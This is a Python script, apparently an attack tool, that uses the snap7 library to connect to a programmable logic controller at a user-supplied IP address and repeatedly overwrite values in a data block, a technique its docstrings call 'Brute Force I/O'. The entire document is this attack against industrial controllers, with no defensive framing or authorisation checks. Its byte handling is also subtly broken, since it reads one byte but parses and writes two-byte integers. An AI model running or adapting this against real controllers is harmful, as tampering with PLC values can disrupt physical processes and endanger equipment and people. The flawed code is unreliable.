import snap7
from snap7.util import *
from snap7.types import *
import time

def discover_plc_ip():
    """
    Discover the PLC's IP address on the network.
    This is a simple example and may need to be adapted based on your network configuration.
    """
    # In a real-world scenario, you might use ARP scanning or other network discovery tools.
    # For simplicity, we assume the PLC's IP is known or provided by the user.
    plc_ip = input("Enter the PLC's IP address: ")
    return plc_ip

def brute_force_io(plc_ip, db_number, start_offset, end_offset, iterations=100, delay=0.1):
    """
    Brute Force I/O by repetitively changing I/O point values within a specified range.
    
    :param plc_ip: IP address of the PLC
    :param db_number: Data block number to target
    :param start_offset: Starting offset within the data block
    :param end_offset: Ending offset within the data block
    :param iterations: Number of iterations to perform
    :param delay: Delay between each change (in seconds)
    """
    # Create a client instance
    client = snap7.client.Client()
    
    try:
        # Connect to the PLC
        client.connect(plc_ip, 0, 1)
        
        # Perform Brute Force I/O
        for i in range(iterations):
            for offset in range(start_offset, end_offset):
                # Read the current value at the offset
                data = client.db_read(db_number, offset, 1)
                current_value = get_int(data, 0)
                
                # Change the value (e.g., increment by 1)
                new_value = (current_value + 1) % 256  # Wrap around if necessary
                set_int(data, 0, new_value)
                
                # Write the new value back to the PLC
                client.db_write(db_number, offset, data)
                
                print(f"Iteration {i+1}: Changed value at offset {offset} to {new_value}")
                
                # Wait for a short period before the next change
                time.sleep(delay)
    
    except Exception as e:
        print(f"An error occurred: {e}")
    
    finally:
        # Disconnect from the PLC
        client.disconnect()

if __name__ == "__main__":
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    
    # Define the parameters for Brute Force I/O
    db_number = 1  # Data block number to target
    start_offset = 0  # Starting offset within the data block
    end_offset = 10  # Ending offset within the data block
    iterations = 100  # Number of iterations
    delay = 0.1  # Delay between each change (in seconds)
    
    # Perform Brute Force I/O
    brute_force_io(plc_ip, db_number, start_offset, end_offset, iterations, delay)